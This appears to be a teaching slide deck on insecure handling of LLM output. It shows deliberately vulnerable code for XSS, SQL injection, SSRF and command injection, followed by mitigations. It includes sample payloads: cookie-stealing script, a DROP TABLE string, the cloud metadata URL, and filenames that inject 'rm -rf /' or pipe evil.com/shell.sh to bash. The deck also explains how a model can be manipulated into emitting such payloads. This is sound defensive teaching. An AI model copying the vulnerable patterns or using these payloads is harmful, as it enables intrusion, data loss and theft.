# LLM02: Insecure Output Handling
## When `LLM` Output Becomes a Weapon

---

## What is Insecure Output Handling?

- `LLM` output is used **without proper validation or sanitization**
- The output is passed to downstream components that interpret it
- Enables traditional web vulnerabilities through a new vector
- The `LLM` becomes an intermediary for attacks

---

## The Core Problem

```diagram
User Input ──► LLM ──► Raw Output ──► Browser / Database / Shell
                                       ▲
                                       │
                                  No sanitization!
```

`LLM` output is **untrusted data** — treat it like user input

---

## Attack Vectors Through `LLM` Output

| Downstream Target | Potential Attack        |
|--------------------|------------------------|
| Web browser        | `XSS` (Cross-Site Scripting) |
| Database query     | `SQL` Injection         |
| Shell command      | Command Injection       |
| `API` calls        | `SSRF`, parameter injection |
| File system        | Path traversal          |
| Email system       | Header injection        |

---

## `XSS` via `LLM` Output

```python
# Vulnerable: LLM output rendered directly in HTML
@app.route("/chat")
def chat():
    user_msg = request.args.get("message")
    response = llm.generate(user_msg)
    # Dangerous! LLM output inserted into HTML
    return f"<div class='response'>{response}</div>"
```

If the `LLM` outputs `<script>steal_cookies()</script>`, the browser executes it

---

## `SQL` Injection via `LLM` Output

```python
# Vulnerable: LLM output used in SQL query
def search_products(user_request):
    # Ask LLM to generate search terms
    search_term = llm.generate(
        f"Extract product name from: {user_request}"
    )
    # Dangerous! LLM output in SQL query
    query = f"SELECT * FROM products WHERE name = '{search_term}'"
    return db.execute(query)
```

An attacker can manipulate the `LLM` to output: `'; DROP TABLE products;--`

---

## Server-Side Request Forgery (`SSRF`)

```python
# Vulnerable: LLM output used as URL
def fetch_reference(user_question):
    url = llm.generate(
        f"Provide a URL reference for: {user_question}"
    )
    # Dangerous! LLM-generated URL fetched by server
    response = requests.get(url)
    return response.text
```

`LLM` could generate: `http://169.254.169.254/latest/meta-data/` (cloud metadata endpoint)

---

## Command Injection via `LLM` Output

```python
# Vulnerable: LLM output used in shell command
def process_file(user_request):
    filename = llm.generate(
        f"Extract the filename from: {user_request}"
    )
    # Dangerous! LLM output in shell command
    os.system(f"cat /uploads/{filename}")
```

`LLM` could output: `file.txt; rm -rf /` or `file.txt; curl evil.com/shell.sh | bash`

---

## Mitigation: Output Encoding

```python
from markupsafe import escape

@app.route("/chat")
def chat():
    user_msg = request.args.get("message")
    response = llm.generate(user_msg)
    # Safe: HTML-encode the output
    safe_response = escape(response)
    return f"<div class='response'>{safe_response}</div>"
```

Always encode `LLM` output for the target context

---

## Mitigation: Parameterized Queries

```python
def search_products(user_request):
    search_term = llm.generate(
        f"Extract product name from: {user_request}"
    )
    # Safe: Use parameterized queries
    query = "SELECT * FROM products WHERE name = %s"
    return db.execute(query, (search_term,))
```

Never concatenate `LLM` output into `SQL` queries

---

## Mitigation: Output Validation

```python
import re

def validate_llm_output(output: str, expected_type: str) -> str:
    if expected_type == "product_name":
        # Only allow alphanumeric and spaces
        if not re.match(r'^[a-zA-Z0-9\s]{1,100}$', output):
            raise ValueError("Invalid product name from LLM")
    elif expected_type == "url":
        # Only allow HTTPS URLs to allowed domains
        allowed = ["docs.example.com", "api.example.com"]
        parsed = urlparse(output)
        if parsed.hostname not in allowed:
            raise ValueError("URL not in allowlist")
    return output
```

---

## Mitigation: Content Security Policy

```python
@app.after_request
def add_security_headers(response):
    # Prevent inline script execution even if XSS occurs
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'"
    )
    return response
```

`CSP` headers provide a safety net against `XSS`

---

## The Golden Rule

> Never pass `LLM` output directly to an interpreter

- **HTML renderer** — encode/sanitize first
- **SQL engine** — use parameterized queries
- **Shell** — avoid entirely; use `APIs` instead
- **File system** — validate and restrict paths
- **`API` calls** — validate against allowlists

---

## Key Takeaways

- `LLM` output is **untrusted data** — always sanitize it
- Apply the **same defenses** you use against user input
- Use **parameterized queries**, **output encoding**, and **allowlists**
- **Content Security Policy** provides an additional safety layer
- The `LLM` can become an unwitting accomplice in traditional attacks
